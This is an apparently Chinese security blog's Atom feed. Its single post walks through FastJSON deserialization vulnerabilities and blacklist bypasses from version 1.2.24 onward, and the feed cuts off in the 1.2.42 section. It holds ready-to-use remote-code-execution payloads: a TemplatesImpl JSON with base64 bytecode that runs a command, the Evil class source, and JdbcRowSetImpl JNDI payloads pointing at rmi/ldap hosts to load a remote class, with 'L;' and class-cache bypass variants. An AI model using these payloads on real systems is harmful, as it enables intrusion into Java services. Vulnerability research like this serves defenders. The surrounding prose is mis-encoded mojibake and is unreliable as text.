<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://const27.com/atom.xml" rel="self"/>
  
  <link href="http://const27.com/"/>
  <updated>2021-09-07T19:04:32.235Z</updated>
  <id>http://const27.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æµ…æFastJSONååºåˆ—åŒ–æ¼æ´ï¼ˆ1.2.24â€”â€”1.2.68ï¼‰</title>
    <link href="http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-07T19:05:14.205Z</published>
    <updated>2021-09-07T19:04:32.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJSON-ç®€ä»‹"><a href="#FastJSON-ç®€ä»‹" class="headerlink" title="FastJSON ç®€ä»‹"></a>FastJSON ç®€ä»‹</h1><p>FastJson æ˜¯ä¸€ä¸ªç”±é˜¿é‡Œå·´å·´ç ”å‘çš„javaåº“ï¼Œå¯ä»¥æŠŠjavaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼ï¼Œä¹Ÿå¯ä»¥æŠŠJSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ã€‚</p><p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a> ğŸ‘ˆé¡¹ç›®åœ°å€</p><p>â€œè‡ª2017å¹´3æœˆ15æ—¥ï¼Œfastjsonå®˜æ–¹ä¸»åŠ¨çˆ†å‡ºå…¶åœ¨<code>1.2.24</code>åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±å®‰å…¨æ¼æ´ä»¥æ¥ï¼Œå„ç§æ–°å‹ç»•è¿‡å§¿åŠ¿å±‚å‡ºä¸ç©·ã€‚â€œâ€”â€”c014</p><h1 id="FASTJSONå’‹ç”¨"><a href="#FASTJSONå’‹ç”¨" class="headerlink" title="FASTJSONå’‹ç”¨"></a>FASTJSONå’‹ç”¨</h1><p>ç­”æ¡ˆï¼šç›´æ¥POMå¯¼å…¥ï¼Œæ–¹ä¾¿åœ°ä¸€æ‰¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;x.x.xx&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><p>import com.alibaba.fastjson.JSON</p><p>fastjsonæœ‰ä¸¤ç§å¸¸è§çš„å¤„ç†JSONçš„æ–¹æ³•</p><ul><li><code>JSON.toJSONString()</code>æ–¹æ³•ï¼šå¯å°†å¯¹è±¡è½¬æ¢æˆ<code>JSON</code>å­—ç¬¦ä¸²</li><li><code>JSON.parseObject()</code>æ–¹æ³•ï¼šå°†<code>JSON</code>å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ã€‚</li></ul><p>ä¸‹é¢çœ‹ä¸€æ³¢å®ä¾‹ï¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå°†å…¶è½¬ä¸ºJSONï¼Œç„¶åå†è½¬å›å¯¹è±¡ã€‚<br>åŒæ—¶å¯ä»¥å‘ç°ï¼Œåœ¨JSONåºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„getxxxæ–¹æ³•ï¼›åœ¨JSONååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        User a &#x3D; new User();</span><br><span class="line">        String json &#x3D; JSON.toJSONString(a);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(JSON.parseObject(json,User.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&#125;</span><br><span class="line">User go</span><br><span class="line">org.example.App$User@36d4b5c</span><br></pre></td></tr></table></figure><h1 id="FASTJSON-ååºåˆ—åŒ–æ¼æ´èµ·æº"><a href="#FASTJSON-ååºåˆ—åŒ–æ¼æ´èµ·æº" class="headerlink" title="FASTJSON ååºåˆ—åŒ–æ¼æ´èµ·æº"></a>FASTJSON ååºåˆ—åŒ–æ¼æ´èµ·æº</h1><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŠŠJSONååºåˆ—åŒ–çš„è¯­å¥æ˜¯ JSON.parseObject(json,User.class)ï¼Œåœ¨æŒ‡å®šJSONæ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šå…¶æ‰€å±çš„ç±»ï¼Œæ˜¾å¾—ä»£ç å°±å¾ˆè‡ƒè‚¿ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨@type(autotype)å­—ç¬¦æ®µæ¥ä½¿å…¶ä¸é‚£ä¹ˆè‡ƒè‚¿ã€‚<br>åƒä¸‹é¢è¿™æ ·ï¼Œåœ¨JSONé€šè¿‡æŒ‡å®š@typeçš„å€¼æ¥å®ç°å®šä½æŸç±»ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>è™½è¯´è¿™ä¹ˆåšå¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯ä»¥è¿™ç§æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šæ‰§è¡Œç±»çš„æ„é€ æ–¹æ³•å’Œå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">setId go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&quot;id&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨è¿™ä¸ªJSONååºåˆ—åŒ–æ¥å£å¤„ï¼Œæˆ‘ä»¬ä¼ å…¥æ¶æ„çš„JSONï¼Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ„é€ æ–¹æ³•ä»¥åŠå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚<br>å¦‚æœæŸç±»çš„ç›¸å…³æ–¹æ³•é‡Œæœ‰å±é™©çš„ä»£ç ï¼ˆå¦‚æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„JSONè¾¾åˆ°RCEçš„ä½œç”¨ã€‚</p><p>å¦å¤–ï¼ŒJSON.parseObject(â€œ{&quot;@type&quot;:&quot;org.example.App$User&quot;,&quot;id&quot;:&quot;123&quot;}â€,Feature.SupportNonPublicField) ï¼Œå¯ä»¥ç›´æ¥ä¸ºprivateæˆå‘˜èµ‹å€¼ï¼ˆä¸åŠ Feature.SupportNonPublicFieldæ˜¯æ— æ³•å¯¹privateæˆå‘˜èµ‹å€¼çš„ï¼‰</p><h1 id="å„ç‰ˆæœ¬å¤ç°"><a href="#å„ç‰ˆæœ¬å¤ç°" class="headerlink" title="å„ç‰ˆæœ¬å¤ç°"></a>å„ç‰ˆæœ¬å¤ç°</h1><h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>æ˜¯çš„ï¼Œå°±æ˜¯7U21é“¾é‡Œé¢çš„TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p><p>è¿™ä¸ªç±»æœ¬èº«å°±å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¼šå°†æˆå‘˜å˜é‡_bytecodesçš„æ•°æ®ä½œä¸ºç±»çš„å­—èŠ‚ç è¿›è¡ŒnewInsantceæ“ä½œä»è€Œè°ƒç”¨å…¶æ„é€ æ–¹æ³•æˆ–staticå—ã€‚æ•…å¯ä»¥fastjsonä¸ºå¥‘æœºå»è°ƒç”¨æ­¤ç±»ã€‚<br>ä½†æ˜¯ç”±äº_name å’Œ_bytecodes æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥éœ€è¦FASTJSONååºåˆ—åŒ–æ¥å£æœ‰Feature.SupportNonPublicFieldå‚æ•°æ‰èƒ½å®ç°ï¼Œåˆ©ç”¨æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œä½†æ˜¯æ¡ä»¶å…è®¸çš„è¯å°±å¾ˆæ–¹ä¾¿ï¼Œpayloadæ‰“è¿‡å»å°±å®Œäº‹ã€‚</p><p>â€œ<em>_tfactoryè¿™ä¸ªå­—æ®µåœ¨TemplatesImplæ—¢æ²¡æœ‰getæ–¹æ³•ä¹Ÿæ²¡æœ‰setæ–¹æ³•ï¼Œè¿™æ²¡å…³ç³»ï¼Œæˆ‘ä»¬è®¾ç½®_tfactoryä¸º{ },fastjsonä¼šè°ƒç”¨å…¶æ— å‚æ„é€ å‡½æ•°å¾—_tfactoryå¯¹è±¡ï¼Œè¿™æ ·å°±è§£å†³äº†æŸäº›ç‰ˆæœ¬ä¸­åœ¨defineTransletClasses()ç”¨åˆ°ä¼šå¼•ç”¨_tfactoryå±æ€§å¯¼è‡´å¼‚å¸¸é€€å‡ºã€‚</em>â€œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_bytecodesçš„ç±»é•¿è¿™æ ·,ç¼–è¯‘ç”ŸæˆEvil.classï¼Œå°†å­—èŠ‚ç è¯»å‡ºå¹¶ç”¨base64åŠ å¯†ï¼Œä½œä¸º_bytecodes</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet&#123;</span><br><span class="line">static &#123;</span><br><span class="line">            System.err.println(&quot;Pwned&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                String[] cmd &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">                java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">            &#125; catch ( Exception e ) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><strong>JdbcRowSetImpl</strong></h3><p><strong>com.sun.rowset.JdbcRowSetImpl</strong>,é€šè¿‡JNDIæ³¨å…¥æ¥å®ç°RCEã€‚ä½†éœ€æ³¨æ„JNDIæ³¨å…¥æœ‰JDKç‰ˆæœ¬é™åˆ¶ï¼Œé«˜ç‰ˆæœ¬éœ€è¦è¿›è¡Œç»•è¿‡ã€‚</p><p>æˆ‘ä»¬çš„payloadä¸€èˆ¬é•¿è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;ip:port&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">or</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ip:1099&#x2F;exp&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªpayloadæ‰“è¿‡å»ï¼Œä¼šæ‰§è¡ŒsetAutoCommit()ï¼ŒåˆsetAutoCommit()æ‰§è¡Œäº†connct()å‡½æ•°ï¼Œå…¶å¦‚ä¸‹ã€‚<br>connect()ä¼šå¯¹dataSourceNameå±æ€§è¿›è¡Œä¸€ä¸ªInitialContext.lookup(dataSourceName),ä»è€Œå®ç°JNDIæ³¨å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Connection connect() throws SQLException &#123;</span><br><span class="line">        if(this.conn !&#x3D; null) &#123;</span><br><span class="line">            return this.conn;</span><br><span class="line">        &#125; else if(this.getDataSourceName() !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                InitialContext var1 &#x3D; new InitialContext();</span><br><span class="line">                DataSource var2 &#x3D; (DataSource)var1.lookup(this.getDataSourceName());</span><br><span class="line">                return this.getUsername() !&#x3D; null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();</span><br><span class="line">            &#125; catch (NamingException var3) &#123;</span><br><span class="line">                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return this.getUrl() !&#x3D; null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><h3 id="æ›´æ–°æœºåˆ¶"><a href="#æ›´æ–°æœºåˆ¶" class="headerlink" title="æ›´æ–°æœºåˆ¶"></a>æ›´æ–°æœºåˆ¶</h3><p>1.2.24åŠä»¥å‰ç‰ˆæœ¬å°±è·Ÿç™½çº¸ä¸€æ ·éšä¾¿æ‰“ï¼Œåœ¨1.2.25å¼€å§‹åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶</p><p>æˆ‘ä»¬ç»§ç»­ç”¨1.2.24çš„payloadï¼ˆè¿™é‡Œç”¨TemplatesImplçš„payloadï¼‰å»æ‰“ï¼Œä¼šå‘ç°æŠ¥é”™autotypeä¸æ”¯æŒ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907163503833.png" alt="image-20210907163503833"></p><p>ç©¶å…¶åŸå› ï¼Œæ˜¯å› ä¸ºåœ¨com.alibaba.fastjson.parser.ParserConfig åŠ å…¥äº†CheckAutoTypeæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass)</span><br></pre></td></tr></table></figure><p><strong>åœ¨å…¶ä¸­æœ‰ä¸ªautotypesupportå±æ€§ï¼Œå¦‚æœä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæ£€æµ‹jsonä¸­@typeçš„å€¼ å¼€å¤´æ˜¯å¦ä¸é»‘åå•ä¸­çš„å€¼ä¸€æ ·ï¼Œè‹¥ä¸€æ ·å°±ç›´æ¥è¿”å›ä¸€ä¸ªå¼‚å¸¸ï¼Œç„¶ååŠ è½½ç™½åå•ä¸­çš„ç±»</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!autoTypeSupport) &#123;</span><br><span class="line">\\é»‘åå•æ£€æµ‹ï¼Œclassnameæ˜¯ä¼ å…¥ç±»çš„å…¨åï¼ŒdenyListæ˜¯é»‘åå•</span><br><span class="line">            for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny &#x3D; denyList[i];</span><br><span class="line">                if (className.startsWith(deny)) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept &#x3D; acceptList[i];</span><br><span class="line">                if (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    return clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907164922626.png" alt="image-20210907164922626">é»‘åå•é•¿è¿™æ ·</p><p><strong>è‹¥autotypesupportå¼€å¯ï¼Œåˆ™ä¼šå…ˆç™½åå•åŠ è½½ï¼Œåé»‘åå•æ£€æµ‹</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept &#x3D; acceptList[i];</span><br><span class="line">        if (className.startsWith(accept)) &#123;</span><br><span class="line">            return TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        String deny &#x3D; denyList[i];</span><br><span class="line">        if (className.startsWith(deny)) &#123;</span><br><span class="line">            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢çš„è®¸å¤šæ›´æ–°éƒ½æ˜¯å¯¹checkAutotypeä»¥åŠæœ¬èº«æŸäº›é€»è¾‘ç¼ºé™·å¯¼è‡´çš„æ¼æ´è¿›è¡Œä¿®å¤ï¼Œä»¥åŠé»‘åå•çš„ä¸æ–­å¢åŠ ã€‚</p><h3 id="bypass-1ï¼ˆL-æ³•ï¼‰1-2-25-1-2-41"><a href="#bypass-1ï¼ˆL-æ³•ï¼‰1-2-25-1-2-41" class="headerlink" title="bypass 1ï¼ˆL;æ³•ï¼‰1.2.25-1.2.41"></a>bypass 1ï¼ˆL;æ³•ï¼‰1.2.25-1.2.41</h3><p>å½“autoTypeSupportå¼€å¯æˆ–expectClassä¸ä¸ºç©ºæ—¶ï¼Œä¼šè°ƒç”¨ä¸€ä¸ªloadclassæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨å…¶ä¸­ï¼Œè‹¥ç±»åä»¥Lå¼€å¤´ï¼›ç»“å°¾ï¼Œåˆ™ä¼šæŠŠè¿™ä¸¤ä¸ªå­—ç¬¦å»æ‰å¹¶åŠ è½½ç±»ã€‚</p><p>â€œè‡³äºä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å¥‡æ€ªçš„å¤„ç†ï¼ŒL å’Œ ; è¿™ä¸€å¯¹å­—ç¬¦å…¶å®æ˜¯ JVM å­—èŠ‚ç ä¸­ç”¨æ¥è¡¨ç¤ºç±»åçš„ï¼šâ€</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;</span><br><span class="line">    String newClassName &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">    return loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨autotypesupportå¼€å¯æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadæ¥bypass</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä½•å¼€å¯autotypesupportï¼Ÿåªéœ€åœ¨jsonè¢«è§£æå‰åŠ å…¥å¦‚ä¸‹ä»£ç å³å¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure><h3 id="bypass-2ï¼ˆjsonå†…ç½®ï¼‰1-2-25-1-2-47"><a href="#bypass-2ï¼ˆjsonå†…ç½®ï¼‰1-2-25-1-2-47" class="headerlink" title="bypass 2ï¼ˆjsonå†…ç½®ï¼‰1.2.25-1.2.47"></a>bypass 2ï¼ˆjsonå†…ç½®ï¼‰1.2.25-1.2.47</h3><ul><li><p>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›</p></li><li><p>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="æ›´æ–°æœºåˆ¶-1"><a href="#æ›´æ–°æœºåˆ¶-1" class="headerlink" title="æ›´æ–°æœºåˆ¶"></a>æ›´æ–°æœºåˆ¶</h3><p>42ç‰ˆæœ¬ä¸­å¼€å‘äººå‘˜å°†æ˜æ–‡é»‘åå•æ”¹æˆäº†hashé»‘åå•ï¼Œå·²ç»æœ‰äººç¢°æ’å‡ºäº†ä¸å°‘ï¼Œæ„ä¹‰ä¸å¤§ï¼›åœ¨å¤„ç†25é»‘åå•ç»•è¿‡çš„æ—¶å€™åšäº†ä¸€ä¸ªæ 